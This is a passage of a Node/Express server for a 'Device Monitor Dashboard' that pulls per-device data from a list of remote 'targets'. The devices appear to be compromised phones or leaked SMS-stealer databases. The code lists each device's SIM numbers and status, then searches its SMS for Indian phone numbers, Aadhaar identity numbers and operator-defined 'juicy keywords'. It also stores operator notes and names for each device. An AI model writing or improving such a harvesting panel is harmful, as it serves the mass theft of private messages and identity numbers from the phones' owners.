function saveNotesFile(notes) {
  try { fs.writeFileSync(NOTES_FILE, JSON.stringify(notes, null, 2)); }
  catch (e) { console.error('Notes save error:', e.message); }
}

// ── Summarise a target from dashboard DB ─────────────────────────────────────
function summariseTarget(target) {
  const db = getTargetDb(target);
  const deviceList = Object.entries(db);
  const total = deviceList.length;
  let online = 0, juicyCount = 0, withSim1 = 0, withSim2 = 0;
  let oldestActivity = null, newestActivity = null;

  for (const [, dev] of deviceList) {
    if (dev.current_status === 'online') online++;
    if ((dev.juicy_keywords || []).length > 0) juicyCount++;
    if (extract10Digits(dev.sim1_number)) withSim1++;
    if (extract10Digits(dev.sim2_number)) withSim2++;
    const act = parseLastActivity(dev.last_activity);
    if (act) {
      if (!oldestActivity || act < oldestActivity) oldestActivity = act;
      if (!newestActivity || act > newestActivity) newestActivity = act;
    }
  }

  return {
    id: target.id, url: target.url, schema: target.schema, total, online,
    offline: total - online, juicyCount, withSim1, withSim2,
    oldestSms: oldestActivity ? oldestActivity.toISOString().slice(0,10) : null,
    newestSms: newestActivity ? newestActivity.toISOString().slice(0,10) : null,
  };
}

function buildDeviceList(target, devices, simOverrides, aadharDb) {
  const simForUrl   = simOverrides[String(target.id)] || {};
  const aadharForUrl = aadharDb[String(target.id)]   || {};

  return Object.entries(devices)
    .map(([deviceId, dev]) => ({
      deviceId,
      brand:         dev.brand          || 'Unknown',
      status:        dev.current_status || 'offline',
      battery:       dev.last_battery   || 'N/A',
      lastActivity:  dev.last_activity  || null,
      smsDate:       dev.last_activity  || null,
      lastOnline:    dev.last_online    || null,
      sim1:          dev.sim1_number    || 'N/A',
      sim2:          dev.sim2_number    || 'N/A',
      sim1Clean:     extract10Digits(simForUrl[deviceId]?.sim1 || dev.sim1_number),
      sim2Clean:     extract10Digits(simForUrl[deviceId]?.sim2 || dev.sim2_number),
      sim1Override:  simForUrl[deviceId]?.sim1 || '',
      sim2Override:  simForUrl[deviceId]?.sim2 || '',
      juicyKeywords: dev.juicy_keywords || [],
      appId:         dev.app_id         || 'N/A',
      objId:         dev.obj_id         || 'N/A',
      userSerial:    dev.user_serial    || 'N/A',
      sim1Enriched:  dev.sim1_enriched  || [],
      sim2Enriched:  dev.sim2_enriched  || [],
      smsLink:       getSmsLink(target, deviceId, dev.obj_id),
      hasAadhaar:    !!(aadharForUrl[deviceId]?.length),
      aadhaarNums:   aadharForUrl[deviceId] || [],
    }))
    .sort((a, b) => {
      if (a.status !== b.status) return a.status === 'online' ? -1 : 1;
      if (b.juicyKeywords.length !== a.juicyKeywords.length)
        return b.juicyKeywords.length - a.juicyKeywords.length;
      return 0;
    });
}

// ── API routes ────────────────────────────────────────────────────────────────
app.get('/api/urls', (req, res) => {
  const summaries = TARGETS.map(t => summariseTarget(t)).filter(t => t.total > 0);
  res.json(summaries);
});

app.get('/api/old/urls', (req, res) => {
  const summaries = OLD_TARGETS.map(t => summariseTarget(t)).filter(t => t.total > 0);
  res.json(summaries);
});

app.get('/api/url/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const target = TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'Not found' });
  const devices     = getTargetDb(target);
  const simOverrides = loadSimOverrides();
  const aadharDb    = loadAadharDb();
  const deviceList  = buildDeviceList(target, devices, simOverrides, aadharDb);
  res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
});

app.get('/api/old/url/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const target = OLD_TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'Not found' });
  const devices     = getTargetDb(target);
  const simOverrides = loadSimOverrides();
  const aadharDb    = loadAadharDb();
  const deviceList  = buildDeviceList(target, devices, simOverrides, aadharDb);
  res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
});

// ── Force-refresh a single target immediately ─────────────────────────────────
app.post('/api/url/:id/refresh', async (req, res) => {
  const id = parseInt(req.params.id);
  const target = TARGETS.find(t => t.id === id) || OLD_TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'Not found' });
  await pollTarget(target);
  res.json({ ok: true, devices: Object.keys(getTargetDb(target)).length });
});

// ── Live fetch (bypasses DB — used by refreshAll in frontend) ─────────────────
app.get('/api/url/:id/live', async (req, res) => {
  const id = parseInt(req.params.id);
  const target = TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'Not found' });
  await pollTarget(target);
  const db = getTargetDb(target);
  const devices = Object.entries(db).map(([deviceId, d]) => ({
    deviceId,
    brand:   d.brand || 'Unknown',
    status:  d.current_status || 'offline',
    battery: d.last_battery   || 'N/A',
  })).sort((a, b) => (a.status === 'online' ? -1 : 1) - (b.status === 'online' ? -1 : 1));
  res.json({ id, total: devices.length, online: devices.filter(d => d.status === 'online').length, devices });
});

// ── SearchNo: find Indian phone numbers in device SMS ─────────────────────────
app.get('/api/url/:id/device/:deviceId/searchno', async (req, res) => {
  const id = parseInt(req.params.id);
  const deviceId = req.params.deviceId;
  const target = TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'URL not found' });
  const db = getTargetDb(target);
  const dev = db[deviceId];
  if (!dev) return res.status(404).json({ error: 'Device not found' });

  const fetchUrl = getSmsLink(target, deviceId, dev.obj_id).replace('?print=pretty', '');
  try {
    const smsData = await fbFetch(fetchUrl);
    const PHONE_RE = /(?<!\d)(?:\+91|91)?([6-9]\d{9})(?!\d)/g;
    const MISSED_CALL_RE = /missed\s+call(s)?\s+(from|to)/i;
    const AVAILABLE_RE = /is\s+now\s+available|available\s+to\s+(take|receive|answer)/i;
    const hits = [];
    for (const msg of iterMsgs(smsData)) {
      const body = String(msg.body || msg.message || msg.msg || msg.text || '');
      if (!body || MISSED_CALL_RE.test(body) || AVAILABLE_RE.test(body)) continue;
      const phones = [...new Set([...body.matchAll(PHONE_RE)].map(m => m[1]))];
      if (phones.length) hits.push({ body, phones });
      if (hits.length >= 100) break;
    }
    res.json({ hits, total: hits.length });
  } catch (e) {
    res.json({ hits: [], total: 0, error: e.message });
  }
});

// ── SearchAadhar: find Aadhaar numbers in device SMS ─────────────────────────
app.get('/api/url/:id/device/:deviceId/searchaadhar', async (req, res) => {
  const id = parseInt(req.params.id);
  const deviceId = req.params.deviceId;
  const target = TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'URL not found' });
  const db = getTargetDb(target);
  const dev = db[deviceId];
  if (!dev) return res.status(404).json({ error: 'Device not found' });

  const fetchUrl = getSmsLink(target, deviceId, dev.obj_id).replace('?print=pretty', '');
  try {
    const smsData = await fbFetch(fetchUrl);
    const AADHAR_RE = /(?<!\d)([2-9]\d{11})(?!\d)/g;
    const AADHAR_KW = /aadhaar|aadhar/i;
    const hits = [];
    for (const msg of iterMsgs(smsData)) {
      const body = String(msg.body || msg.message || msg.msg || msg.text || '');
      if (!body) continue;
      const aadhars = [...new Set([...body.matchAll(AADHAR_RE)].map(m => m[1]))];
      if (aadhars.length && AADHAR_KW.test(body)) hits.push({ body, aadhars, hasKeyword: true });
      if (hits.length >= 100) break;
    }
    res.json({ hits, total: hits.length });
  } catch (e) {
    res.json({ hits: [], total: 0, error: e.message });
  }
});

// ── SMS Search: search all devices in a URL for keyword ──────────────────────
app.get('/api/url/:id/sms-search', async (req, res) => {
  const id = parseInt(req.params.id);
  const q  = (req.query.q || '').trim().toLowerCase();
  if (!q) return res.json({ hits: [], total: 0, error: 'No query' });
  const target = TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'URL not found' });

  const db = getTargetDb(target);
  const deviceEntries = Object.entries(db);
  if (!deviceEntries.length) return res.json({ hits: [], total: 0, error: 'No cached devices' });

  const hits = [], errors = [];
  let stopped = false;
  for (const [deviceId, dev] of deviceEntries) {
    if (stopped) break;
    const fetchUrl = getSmsLink(target, deviceId, dev.obj_id).replace(/\?.*$/, '');
    try {
      const smsData = await fbFetch(fetchUrl);
      for (const msg of iterMsgs(smsData)) {
        const body = String(msg.body || msg.message || msg.msg || msg.text || '');
        if (!body) continue;
        if (body.toLowerCase().includes(q)) {
          hits.push({ deviceId, brand: dev.brand || 'Unknown', body });
          if (hits.length >= 200) { stopped = true; break; }
        }
      }
    } catch (e) {
      errors.push(`${deviceId}: ${e.message}`);
    }
  }
  res.json({ hits, total: hits.length, errors: errors.slice(0, 10) });
});

// ── Global device search across all new URLs ──────────────────────────────────
app.get('/api/search/device/:deviceId', (req, res) => {
  const q = req.params.deviceId.toLowerCase().trim();
  const results = [];
  for (const target of TARGETS) {
    const db = getTargetDb(target);
    for (const [deviceId, dev] of Object.entries(db)) {
      if (deviceId.toLowerCase().includes(q)) {
        results.push({
          urlId: target.id, url: target.url, schema: target.schema, deviceId,
          brand:        dev.brand          || 'Unknown',
          status:       dev.current_status || 'offline',
          battery:      dev.last_battery   || 'N/A',
          sim1:         dev.sim1_number    || 'N/A',
          sim2:         dev.sim2_number    || 'N/A',
          lastActivity: dev.last_activity  || null,
          juicyKeywords: dev.juicy_keywords || [],
          smsLink:      getSmsLink(target, deviceId, dev.obj_id),
        });
      }
    }
  }
  res.json({ results, total: results.length });
});

// ── Debug: dump aadhar DB for a specific URL ──────────────────────────────────
app.get('/api/debug/aadhar/:id', (req, res) => {
  const id  = req.params.id;
  const adb = loadAadharDb();
  res.json({
    file: AADHAR_FILE, exists: fs.existsSync(AADHAR_FILE),
    urlKeys: Object.keys(adb).slice(0, 10),
    devicesForUrl: adb[id] || {},
    count: Object.keys(adb[id] || {}).length,
  });
});

// ── SIM Overrides ─────────────────────────────────────────────────────────────
app.get('/api/sim-overrides/:urlId', (req, res) => {
  const overrides = loadSimOverrides();
  res.json(overrides[req.params.urlId] || {});
});

app.post('/api/sim-overrides/:urlId/:deviceId', express.json(), (req, res) => {
  const { urlId, deviceId } = req.params;
  const { sim1, sim2 } = req.body;
  const overrides = loadSimOverrides();
  if (!overrides[urlId]) overrides[urlId] = {};
  if (!overrides[urlId][deviceId]) overrides[urlId][deviceId] = {};
  if (sim1 !== undefined) overrides[urlId][deviceId].sim1 = sim1;
  if (sim2 !== undefined) overrides[urlId][deviceId].sim2 = sim2;
  if (!overrides[urlId][deviceId].sim1 && !overrides[urlId][deviceId].sim2)
    delete overrides[urlId][deviceId];
  saveSimOverrides(overrides);
  res.json({ ok: true });
});

app.post('/api/old/sim-overrides/:urlId/:deviceId', express.json(), (req, res) => {
  const { urlId, deviceId } = req.params;
  const { sim1, sim2 } = req.body;
  const overrides = loadSimOverrides();
  const key = `old_${urlId}`;
  if (!overrides[key]) overrides[key] = {};
  if (!overrides[key][deviceId]) overrides[key][deviceId] = {};
  if (sim1 !== undefined) overrides[key][deviceId].sim1 = sim1;
  if (sim2 !== undefined) overrides[key][deviceId].sim2 = sim2;
  if (!overrides[key][deviceId].sim1 && !overrides[key][deviceId].sim2)
    delete overrides[key][deviceId];
  saveSimOverrides(overrides);
  res.json({ ok: true });
});

// ── Device Notes ──────────────────────────────────────────────────────────────
app.get('/api/notes/:urlId/:deviceId', (req, res) => {
  const key = `${req.params.urlId}:${req.params.deviceId}`;
  const notes = loadNotes();
  res.json({ note: notes[key] || '' });
});

app.post('/api/notes/:urlId/:deviceId', express.json(), (req, res) => {
  const key = `${req.params.urlId}:${req.params.deviceId}`;
  const notes = loadNotes();
  notes[key] = req.body.note || '';
  saveNotesFile(notes);
  res.json({ ok: true });
});

// ── Device Names: save/load human-readable names per device ──────────────────
const NAMES_FILE = path.join(DATA_DIR, 'device_names.json');

function loadNames() {
  try { if (fs.existsSync(NAMES_FILE)) return JSON.parse(fs.readFileSync(NAMES_FILE, 'utf8')); }
  catch {}
  return {};
}
function saveNamesFile(names) {
  try { fs.writeFileSync(NAMES_FILE, JSON.stringify(names, null, 2)); }
  catch (e) { console.error('Names save error:', e.message); }
}

app.get('/api/names/:urlId/:deviceId', (req, res) => {
  const key = `${req.params.urlId}:${req.params.deviceId}`;
  res.json({ name: loadNames()[key] || '' });
});

app.post('/api/names/:urlId/:deviceId', express.json(), (req, res) => {
  const key = `${req.params.urlId}:${req.params.deviceId}`;
  const names = loadNames();
  names[key] = (req.body.name || '').trim();
  if (!names[key]) delete names[key];
  saveNamesFile(names);
  res.json({ ok: true });
});

// Bulk load all names for a URL (for efficient table rendering)
app.get('/api/names/:urlId', (req, res) => {
  const prefix = `${req.params.urlId}:`;
  const all = loadNames();
  const forUrl = {};
  for (const [k, v] of Object.entries(all)) {
    if (k.startsWith(prefix)) forUrl[k.slice(prefix.length)] = v;
  }
  res.json(forUrl);
});

// ── Keywords: get/update the juicy keywords list ──────────────────────────────
const KEYWORDS_FILE = path.join(DATA_DIR, 'keywords.json');

function loadKeywords() {
  try { if (fs.existsSync(KEYWORDS_FILE)) return JSON.parse(fs.readFileSync(KEYWORDS_FILE, 'utf8')); }
  catch {}
  // Return the built-in list as default
  return [...JUICY_KEYWORDS];
}
function saveKeywordsFile(kws) {
  try { fs.writeFileSync(KEYWORDS_FILE, JSON.stringify(kws, null, 2)); }
  catch (e) { console.error('Keywords save error:', e.message); }
}

app.get('/api/keywords', (req, res) => {
  res.json({ keywords: loadKeywords() });
});

app.post('/api/keywords', express.json(), (req, res) => {
  const kws = req.body.keywords;
  if (!Array.isArray(kws)) return res.status(400).json({ error: 'keywords must be array' });
  const clean = [...new Set(kws.map(k => String(k).trim().toLowerCase()).filter(Boolean))];
  saveKeywordsFile(clean);
  // Hot-reload: update in-memory JUICY_KEYWORDS array
  JUICY_KEYWORDS.length = 0;
  for (const k of clean) JUICY_KEYWORDS.push(k);
  res.json({ ok: true, count: clean.length });
});

// ── Serve frontend ────────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, 'public')));
app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

// ── Boot ──────────────────────────────────────────────────────────────────────
loadDashboardDb();
// Load custom keywords if saved, otherwise use built-in defaults
const savedKws = (() => {
  try { if (fs.existsSync(KEYWORDS_FILE)) return JSON.parse(fs.readFileSync(KEYWORDS_FILE, 'utf8')); } catch {}
  return null;
})();
if (savedKws && Array.isArray(savedKws)) {
  JUICY_KEYWORDS.length = 0;
  for (const k of savedKws) JUICY_KEYWORDS.push(k);
}
app.listen(PORT, () => {
  console.log(`Device Monitor Dashboard running at http://localhost:${PORT}`);
  console.log(`Dashboard DB: ${DB_FILE}`);
  runPoller(); // start background polling
});

